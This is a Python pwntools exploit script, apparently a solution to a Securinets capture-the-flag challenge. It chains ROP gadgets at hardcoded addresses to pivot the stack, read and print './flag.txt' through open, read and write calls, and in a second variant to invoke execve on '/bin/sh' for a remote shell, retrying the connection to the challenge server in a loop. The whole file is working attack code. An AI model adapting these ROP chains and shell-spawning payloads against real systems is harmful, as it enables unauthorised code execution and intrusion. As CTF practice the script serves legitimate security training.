from pwn import *
from time import sleep
context.arch='amd64'
#context.log_level = 'debug'

e = ELF('./main')

pop_rdi_ret = 0x401f3d
pop_rsi_ret = 0x40ab23
pop_rdx_pop_rbx_ret = 0x463367
pop_rsp_ret = 0x402308
pop_rax_ret = 0x431c77
ret = 0x40186D
syscall = 0x4011a2

payload = p64(ret) * 8
payload += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_ret) + p64(0x4a7800) + p64(pop_rdx_pop_rbx_ret) + p64(0x100) + b'arttnba3' + p64(e.sym['read'])
payload += p64(pop_rsp_ret) + p64(0x4a7800)

payload2 = p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_ret) + p64(0x4a7900) + p64(pop_rdx_pop_rbx_ret) + p64(0x100) + b'arttnba3' + p64(e.sym['read'])
payload2 += p64(pop_rdi_ret) + p64(0x4a7900) + p64(pop_rsi_ret) + p64(4) + p64(e.sym['open'])
payload2 += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(0x4a7900) + p64(pop_rdx_pop_rbx_ret) + p64(0x100) + b'arttnba3' + p64(e.sym['read'])
payload2 += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(0x4a7900) + p64(pop_rdx_pop_rbx_ret) + p64(0x100) + b'arttnba3' + p64(e.sym['write'])

payload3 = p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_ret) + p64(0x4a7900) + p64(pop_rdx_pop_rbx_ret) + p64(0x100) + b'arttnba3' + p64(e.sym['read'])
payload3 += p64(pop_rdi_ret) + p64(0x4a7900) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_pop_rbx_ret) + p64(0) + b'arttnba3' + p64(pop_rax_ret) + p64(59) + p64(ret) + p64(syscall)

def exp(p):
	p.sendline(b'2')
	p.sendline(payload)
	for i in range(5):
		p.sendline(b'')
	p.sendline(b'3')
	p.sendline(payload2)
	p.sendline(b'./flag.txt\x00')
	s = p.recvuntil(b'{', timeout = 1)
	if s == b'':
		return
	else:
		s += p.recvuntil(b'}')
		print(s)
		exit(0)
	#gdb.attach(p)
	p.interactive()

def exp2(p):
	p.sendline(b'2')
	sleep(0.5)
	p.sendline(payload)
	sleep(0.5)
	for i in range(5):
		p.sendline(b'')
	p.sendline(b'3')
	sleep(0.5)
	p.sendline(payload3)
	sleep(0.5)
	p.sendline(b'/bin/sh\x00')
	p.sendline(b'ls')
	s = p.recvuntil(b'flag', timeout = 1)
	if s == b'':
		log.warn('nothing received!')
		return
	else:
		p.interactive()
		exit(0)

if __name__ == '__main__':
	while True:
		try:
			#p = process('./main')
			p = remote('pwn.ctf.securinets.tn', 7777)
			exp2(p)
		except Exception:
			pass
		finally:
			p.close()
			sleep(1)
